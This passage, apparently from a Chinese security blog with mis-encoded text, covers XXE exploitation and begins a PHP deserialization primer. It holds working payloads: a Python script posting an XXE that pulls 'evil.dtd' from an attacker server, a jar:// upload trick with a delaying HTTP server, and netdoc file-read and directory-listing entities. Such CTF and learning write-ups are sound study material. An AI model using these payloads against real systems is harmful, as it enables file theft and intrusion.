<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&#x27;http://9b6b0b8a-f306-4372-9f2c-60abfae7b4d4.challenge.ctf.show/&#x27;</span><br>payload = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&lt;!DOCTYPE convert [</span><br><span class="hljs-string">&lt;!ENTITY % remote SYSTEM &quot;http://vps/evil.dtd&quot;&gt;</span><br><span class="hljs-string">%remote;%int;%send;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = payload.encode(<span class="hljs-string">&#x27;utf-16&#x27;</span>)<br>rep = requests.post(url=url, data=payload)<br><span class="hljs-built_in">print</span>(rep.text)<br></code></pre></td></tr></table></figure>

<p>æˆ–è€…å‘½ä»¤è½¬æ¢ç¼–ç <code>iconv -f utf8 -t UTF-32LE  1.xml &gt; 2.xml</code>ï¼Œ<code>echo urlencode(file_get_contents(&quot;payload.xml&quot;));</code>è¯»</p>
<h2 id="jar-x2F-x2F-æ–‡ä»¶ä¸Šä¼ "><a href="#jar-x2F-x2F-æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="jar:&#x2F;&#x2F; æ–‡ä»¶ä¸Šä¼ "></a>jar:&#x2F;&#x2F; æ–‡ä»¶ä¸Šä¼ </h2><p><code>Java</code>ç¯å¢ƒä¸‹è¿˜å¯ä»¥åˆ©ç”¨<code>jar</code>åè®®ä¸Šä¼ æ–‡ä»¶</p>
<p><code>jar</code>åè®®è¯­æ³•ï¼Œ<code>jar:&#123;url&#125;!/&#123;entry&#125;</code>ï¼Œ<code>url</code>æ˜¯æ–‡ä»¶çš„è·¯å¾„ï¼Œ<code>entry</code>æ˜¯æƒ³è¦è§£å‹å‡ºæ¥çš„æ–‡ä»¶</p>
<p>jar åè®®å¤„ç†æ–‡ä»¶çš„è¿‡ç¨‹ï¼š<br>1ï¼šä¸‹è½½ jar&#x2F;zip æ–‡ä»¶åˆ°ä¸´æ—¶æ–‡ä»¶ä¸­<br>2ï¼šæå–å‡ºæˆ‘ä»¬æŒ‡å®šçš„æ–‡ä»¶<br>3ï¼šåˆ é™¤ä¸´æ—¶æ–‡ä»¶</p>
<p>payload</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">convert</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY  <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;jar:http://ip:port/1.zip!/1.php&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">convert</span>&gt;</span><span class="hljs-symbol">&amp;remote;</span><span class="hljs-tag">&lt;/<span class="hljs-name">convert</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>å½“<code>1.zip</code>ä¸­æ²¡æœ‰<code>1.php</code>æ—¶ï¼Œ<code>java</code>è§£æå™¨å°±ä¼šæŠ¥é”™ï¼Œè¯´åœ¨è¿™ä¸ªä¸´æ—¶æ–‡ä»¶ä¸­æ‰¾ä¸åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œè¿™æ ·å°±å¾—åˆ°äº†ä¸´æ—¶æ–‡ä»¶çš„è·¯å¾„ï¼Œå¯ä»¥åˆ©ç”¨æ–‡ä»¶åŒ…å«ç­‰æ¼æ´å»è¿›ä¸€æ­¥åˆ©ç”¨è¿™ä¸ªæ–‡ä»¶ï¼Œå…¶åŸç†ç±»ä¼¼äº<code>php</code>çš„<code>phpinfo</code>ä¸´æ—¶æ–‡ä»¶åŒ…å«</p>
<p>æœ¬åœ°æ­å»ºä¸€ä¸ªç¯å¢ƒæµ‹è¯•ï¼š</p>
<p>main.javaï¼Œéƒ¨ç½²åœ¨tomcatä¸Šï¼Œæ¨¡æ‹Ÿä¸€ä¸ªå­˜åœ¨xxeæ¼æ´çš„ç½‘é¡µ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.w3c.dom.Element;<br><span class="hljs-keyword">import</span> org.w3c.dom.Node;<br><span class="hljs-keyword">import</span> org.w3c.dom.NodeList;<br><span class="hljs-keyword">import</span> org.xml.sax.InputSource;<br><span class="hljs-keyword">import</span> org.w3c.dom.Document;<br><span class="hljs-keyword">import</span> org.xml.sax.SAXException;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> javax.xml.parsers.DocumentBuilder;<br><span class="hljs-keyword">import</span> javax.xml.parsers.DocumentBuilderFactory;<br><span class="hljs-keyword">import</span> javax.xml.parsers.ParserConfigurationException;<br><br><span class="hljs-meta">@WebServlet(&quot;/xxe&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">main</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException&#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">parmeter</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;poc&quot;</span>);<br><br>        <span class="hljs-type">DocumentBuilderFactory</span> <span class="hljs-variable">dbf</span> <span class="hljs-operator">=</span> DocumentBuilderFactory.newInstance();<br>        <span class="hljs-type">DocumentBuilder</span> <span class="hljs-variable">db</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            db = dbf.newDocumentBuilder();<br>        &#125; <span class="hljs-keyword">catch</span> (ParserConfigurationException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>        <span class="hljs-type">StringReader</span> <span class="hljs-variable">sr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(parmeter);<br>        <span class="hljs-type">InputSource</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(sr);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Document</span> <span class="hljs-variable">document</span> <span class="hljs-operator">=</span> db.parse(is);<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>            <span class="hljs-type">Element</span> <span class="hljs-variable">element</span> <span class="hljs-operator">=</span> document.getDocumentElement();<br>            <span class="hljs-type">NodeList</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> element.getChildNodes();<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">iloop</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; iloop &lt; list.getLength(); iloop++) &#123;<br>                <span class="hljs-type">Node</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> list.item(iloop);<br>                <span class="hljs-keyword">if</span> (node.getNodeType() == Node.ELEMENT_NODE) &#123;<br>                    writer.write(node.getNodeName() + <span class="hljs-string">&quot;ï¼š&quot;</span><br>                            + node.getTextContent());<br>                &#125;<br>            &#125;<br>            writer.close();<br>        &#125; <span class="hljs-keyword">catch</span> (SAXException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/img/summary/xxe-5.png"></p>
<p>å†ç”¨pythonèµ·ä¸ªhttpæœåŠ¡ï¼Œè¿›è¡Œç›‘å¬</p>
<p>xxe-jar.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> socketserver<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><span class="hljs-keyword">import</span> http.client <span class="hljs-keyword">as</span> httpc<br><br>listen_host = <span class="hljs-string">&#x27;localhost&#x27;</span><br>listen_port = <span class="hljs-number">9999</span><br>jar_file = sys.argv[<span class="hljs-number">1</span>]<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">JarRequestHandler</span>(socketserver.BaseRequestHandler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle</span>(<span class="hljs-params">self</span>):<br>        http_req = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;New connection:&#x27;</span>,self.client_address)<br>        <span class="hljs-keyword">while</span> <span class="hljs-string">b&#x27;\r\n\r\n&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> http_req:<br>            <span class="hljs-keyword">try</span>:<br>                http_req += self.request.recv(<span class="hljs-number">4096</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Client req:\r\n&#x27;</span>,http_req.decode())<br>                jf = <span class="hljs-built_in">open</span>(jar_file, <span class="hljs-string">&#x27;rb&#x27;</span>)<br>                contents = jf.read()<br>                headers = (<span class="hljs-string">&#x27;&#x27;&#x27;HTTP/1.0 200 OK\r\n&#x27;&#x27;&#x27;</span><br>                <span class="hljs-string">&#x27;&#x27;&#x27;Content-Type: application/java-archive\r\n\r\n&#x27;&#x27;&#x27;</span>)<br>                self.request.sendall(headers.encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br><br>                self.request.sendall(contents[:-<span class="hljs-number">1</span>])<br>                time.sleep(<span class="hljs-number">30</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-number">30</span>)<br>                self.request.sendall(contents[-<span class="hljs-number">1</span>:])<br><br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;get error at:&quot;</span>+<span class="hljs-built_in">str</span>(e))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>    jarserver = socketserver.TCPServer((listen_host,listen_port), JarRequestHandler)<br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;waiting for connection...&#x27;</span>)<br>    server_thread = threading.Thread(target=jarserver.serve_forever)<br>    server_thread.daemon = <span class="hljs-literal">True</span><br>    server_thread.start()<br>    server_thread.join()<br></code></pre></td></tr></table></figure>


<p>æ‰§è¡Œ<code>python xxe-jar.py evil.zip</code></p>
<p><code>evil.zip</code>å°±æ˜¯è¦ä¸Šä¼ çš„æ–‡ä»¶äº†ï¼Œä¸ä¸€å®šè¦æ˜¯<code>zip</code>ï¼Œä½†æ˜¯å› ä¸º<code>jar</code>åè®®ä¼šå¯¹æ–‡ä»¶è¿›è¡Œè§£åŒ…æ“ä½œï¼Œå¦‚æœä¸ä¸Šä¼ <code>zip</code>æ ¼å¼æ–‡ä»¶åœ¨æŠ¥é”™é‡Œæ˜¯çœ‹ä¸åˆ°ä¸´æ—¶æ–‡ä»¶è·¯å¾„çš„ï¼Œæ‰€ä»¥éœ€è¦å…ˆæ­£å¸¸ä¸Šä¼ ä¸€æ¬¡<code>zip</code>æ ¼å¼æ–‡ä»¶è·å–è·¯å¾„ç„¶åå†ä¸Šä¼ å…¶ä»–æ–‡ä»¶</p>
<p>è®¿é—®<code>/xxe</code>ï¼Œ<code>post</code>å‘<code>payload</code></p>
<p>è·å–è·¯å¾„<br><img src="/img/summary/xxe-7.png"></p>
<p>ä¸Šä¼ æ–‡ä»¶<br><img src="/img/summary/xxe-8.png"></p>
<p>ç›‘å¬æƒ…å†µï¼Œ<code>30</code>æ˜¯å»¶æ—¶äº†<code>30</code>ç§’<br><img src="/img/summary/xxe-6.png"></p>
<p>è‡³äºä¸ºä»€ä¹ˆè¦å»¶è¿Ÿï¼Œå›åˆ°<code>jar</code>åè®®å¤„ç†æ–‡ä»¶çš„è¿‡ç¨‹ï¼Œå› ä¸ºæœ€åä¸€æ­¥ä¼šåˆ é™¤ä¸´æ—¶æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±è¦è€ƒè™‘å¦‚ä½•è®©è¿™ä¸ªæ–‡ä»¶èƒ½æ›´é•¿æ—¶é—´çš„åœç•™åœ¨æˆ‘ä»¬çš„ç³»ç»Ÿä¹‹ä¸­ï¼Œè§£å†³æ–¹æ³•æ˜¯åœ¨æ–‡ä»¶ç»“å°¾æ·»åŠ ä¸€ä¸ªåƒåœ¾å­—ç¬¦ï¼Œç„¶åå‘é€é™¤äº†æœ€åä¸€ä¸ªå­—èŠ‚çš„æ‰€æœ‰æ•°æ®åè¿›è¡Œ<code>sleep</code>ï¼Œè¿™æ ·å®é™…ä¸Šå·²ç»ä¼ å®Œäº†ï¼Œä½†æ˜¯æœåŠ¡å™¨ä»¥ä¸ºæ²¡ä¼ å®Œï¼Œå°±æš‚æ—¶ä¸ä¼šåˆ é™¤ä¸´æ—¶æ–‡ä»¶äº†</p>
<h2 id="netdoc-åè®®"><a href="#netdoc-åè®®" class="headerlink" title="netdoc åè®®"></a>netdoc åè®®</h2><p><code>Java</code>ä¸­<code>netdoc</code>åè®®å¯ä»¥æ›¿ä»£<code>file</code>åè®®åŠŸèƒ½ï¼Œè¯»æ–‡ä»¶ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥åˆ—ç›®å½•</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">creds</span> [</span><br><span class="hljs-meta">        <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">creds</span> <span class="hljs-keyword">ANY</span>&gt;</span></span><br><span class="hljs-meta">        <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;netdoc:///c:/windows/system.ini&quot;</span>&gt;</span></span><br><span class="hljs-meta">        ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">creds</span> [</span><br><span class="hljs-meta">        <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">creds</span> <span class="hljs-keyword">ANY</span>&gt;</span></span><br><span class="hljs-meta">        <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;netdoc:///var/www/html/&quot;</span>&gt;</span></span><br><span class="hljs-meta">        ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure>




<p>å‚è€ƒï¼š<br><a href="https://xz.aliyun.com/t/6887">ä»XMLç›¸å…³ä¸€æ­¥ä¸€æ­¥åˆ°XXEæ¼æ´</a><br><a href="https://johnfrod.top/%E5%AE%89%E5%85%A8/xxe-%E6%80%BB%E7%BB%93/">XXE æ€»ç»“</a><br><a href="https://xz.aliyun.com/t/3357">ä¸€ç¯‡æ–‡ç« å¸¦ä½ æ·±å…¥ç†è§£æ¼æ´ä¹‹ XXE æ¼æ´</a><br><a href="https://xz.aliyun.com/t/8041">ä»å‡ é“CTFé¢˜å­¦ä¹ Blind XXE</a><br><a href="https://jlkl.github.io/2020/08/24/Java_03/">Java XXE æ¼æ´</a><br><a href="https://github.com/proudwind/javasec_study/blob/master/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-xxe.md">javaä»£ç å®¡è®¡-xxe</a><br><a href="https://www.cnblogs.com/SUN99bk/p/11826523.html">XMLä¹‹DTD</a><br><a href="https://xi4or0uji.github.io/2018/11/29/xxe%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/#XML">xxeæ¼æ´æ”»å‡»ä¸é˜²å¾¡</a><br><a href="https://www.rc.sb/xxe/#%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95">XXE æ¼æ´æ€»ç»“</a></p>
]]></content>
      <categories>
        <category>æ€»ç»“</category>
      </categories>
      <tags>
        <tag>æ€»ç»“</tag>
        <tag>xxe</tag>
      </tags>
  </entry>
  <entry>
    <title>phpååºåˆ—åŒ–æ€»ç»“</title>
    <url>/posts/dad17cf6/</url>
    <content><![CDATA[<h1 id="å¸¸è§çš„é­”æœ¯æ–¹æ³•"><a href="#å¸¸è§çš„é­”æœ¯æ–¹æ³•" class="headerlink" title="å¸¸è§çš„é­”æœ¯æ–¹æ³•"></a>å¸¸è§çš„é­”æœ¯æ–¹æ³•</h1><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">__construct</span>()ï¼š åœ¨åˆ›å»ºå¯¹è±¡æ—¶å€™åˆå§‹åŒ–å¯¹è±¡ï¼Œä¸€èˆ¬ç”¨äºå¯¹å˜é‡èµ‹åˆå€¼ã€‚<br><span class="hljs-title function_ invoke__">__destruct</span>()ï¼š å’Œæ„é€ å‡½æ•°ç›¸åï¼Œå½“å¯¹è±¡æ‰€åœ¨å‡½æ•°è°ƒç”¨å®Œæ¯•åæ‰§è¡Œã€‚<br><span class="hljs-title function_ invoke__">__call</span>()ï¼š å½“è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•ä¼šè‡ªåŠ¨è°ƒç”¨è¯¥æ–¹æ³•ã€‚<br><span class="hljs-title function_ invoke__">__get</span>()ï¼š è·å–å¯¹è±¡ä¸å­˜åœ¨çš„å±æ€§æ—¶æ‰§è¡Œæ­¤å‡½æ•°ã€‚<br><span class="hljs-title function_ invoke__">__set</span>()ï¼š è®¾ç½®å¯¹è±¡ä¸å­˜åœ¨çš„å±æ€§æ—¶æ‰§è¡Œæ­¤å‡½æ•°ã€‚<br><span class="hljs-title function_ invoke__">__toString</span>()ï¼š å½“å¯¹è±¡è¢«å½“åšä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è°ƒç”¨ã€‚<br><span class="hljs-title function_ invoke__">__sleep</span>()ï¼š åºåˆ—åŒ–å¯¹è±¡ä¹‹å‰å°±è°ƒç”¨æ­¤æ–¹æ³•(å…¶è¿”å›éœ€è¦ä¸€ä¸ªæ•°ç»„)<br><span class="hljs-title function_ invoke__">__wakeup</span>()ï¼š ååºåˆ—åŒ–æ¢å¤å¯¹è±¡ä¹‹å‰è°ƒç”¨è¯¥æ–¹æ³•<br><span class="hljs-title function_ invoke__">__isset</span>()ï¼š åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨<span class="hljs-keyword">isset</span>()æˆ–<span class="hljs-keyword">empty</span>()è§¦å‘<br><span class="hljs-title function_ invoke__">__unset</span>()ï¼š åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨<span class="hljs-keyword">unset</span>()æ—¶è§¦å‘<br><span class="hljs-title function_ invoke__">__invoke</span>()ï¼š å°†å¯¹è±¡å½“ä½œå‡½æ•°æ¥ä½¿ç”¨æ—¶æ‰§è¡Œæ­¤æ–¹æ³•<br></code></pre></td></tr></table></figure>

<h2 id="construct-amp-destruct"><a href="#construct-amp-destruct" class="headerlink" title="__construct &amp; __destruct"></a>__construct &amp; __destruct</h2><p><code>__construct</code>ï¼šåœ¨å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œä¼šè¢«è‡ªåŠ¨è°ƒç”¨ï¼Œå¯ä»¥ä½œä¸ºépublicæƒé™å±æ€§çš„åˆå§‹åŒ–<br><code>__destruct</code>ï¼šå’Œæ„é€ å‡½æ•°ç›¸åï¼Œå½“å¯¹è±¡é”€æ¯æ—¶ä¼šè°ƒç”¨æ­¤æ–¹æ³•ï¼Œä¸€æ˜¯ç”¨æˆ·ä¸»åŠ¨é”€æ¯å¯¹è±¡ï¼ŒäºŒæ˜¯å½“ç¨‹åºç»“æŸæ—¶ç”±å¼•æ“è‡ªåŠ¨é”€æ¯</p>
<p>ä¾‹å­ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__construct\n&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>	&#125;<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__destruct\n&quot;</span>;<br>	&#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;admin888&#x27;</span>);<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;abc\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;--------------------\n&quot;</span>;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;admin888&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;abc\n&quot;</span>;<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">__construct<br>__destruct<br>abc<br>--------------------<br>__construct<br>abc<br>__destruct<br></code></pre></td></tr></table></figure>

<h2 id="sleep-amp-wakeup"><a href="#sleep-amp-wakeup" class="headerlink" title="__sleep &amp; __wakeup"></a>__sleep &amp; __wakeup</h2><p><code>__sleep</code>ï¼šåºåˆ—åŒ–æ—¶è‡ªåŠ¨è°ƒç”¨<br><code>__wakeup</code>ï¼šååºåˆ—åŒ–æ—¶è‡ªåŠ¨è°ƒç”¨</p>
<blockquote>
<p>å¦‚æœç±»ä¸­åŒæ—¶å®šä¹‰äº† __unserialize()å’Œ__wakeup() ä¸¤ä¸ªé­”æœ¯æ–¹æ³•ï¼Œ<br>åˆ™åªæœ‰ __unserialize() æ–¹æ³•ä¼šç”Ÿæ•ˆï¼Œ__wakeup() æ–¹æ³•ä¼šè¢«å¿½ç•¥ã€‚</p>
</blockquote>
<blockquote>
<p>åŒç†ï¼Œå¦‚æœç±»ä¸­åŒæ—¶å®šä¹‰äº† __serialize()å’Œ __sleep() ä¸¤ä¸ªé­”æœ¯æ–¹æ³•ï¼Œ<br>åˆ™åªæœ‰ __serialize() æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚ __sleep() æ–¹æ³•ä¼šè¢«å¿½ç•¥æ‰ã€‚</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__construct\n&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>	&#125;<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__sleep\n&quot;</span>;<br>		<span class="hljs-keyword">return</span> [username,password]; <span class="hljs-comment">//éœ€è¦è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡ä¸­æ‰€æœ‰å˜é‡åç§°çš„æ•°ç»„ã€‚å¦‚æœè¯¥æ–¹æ³•ä¸è¿”å›ä»»ä½•å†…å®¹ï¼Œåˆ™NULLè¢«åºåˆ—åŒ–ï¼Œå¯¼è‡´ä¸€ä¸ªE_NOTICEé”™è¯¯</span><br>	&#125;<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__wakeup\n&quot;</span>;<br>		<span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">&#x27;user&#x27;</span>;<br>	&#125;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;admin888&#x27;</span>);<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$data</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;-----------------------------\n&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>));<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">__construct<br>__sleep<br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;admin888&quot;</span>;&#125;<br>-----------------------------<br>__wakeup<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span>#2 (2) </span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span> =&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;user&quot;</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span> =&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;admin888&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="call-amp-callstatic"><a href="#call-amp-callstatic" class="headerlink" title="__call &amp; __callstatic"></a>__call &amp; __callstatic</h2><p><code>__call</code>ï¼šå¯¹è±¡æ‰§è¡Œç±»ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨<code>__call</code>æ–¹æ³•<br><code>__callstatic</code>ï¼šç›´æ¥æ‰§è¡Œç±»ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨<code>__callstatic</code>æ–¹æ³•</p>
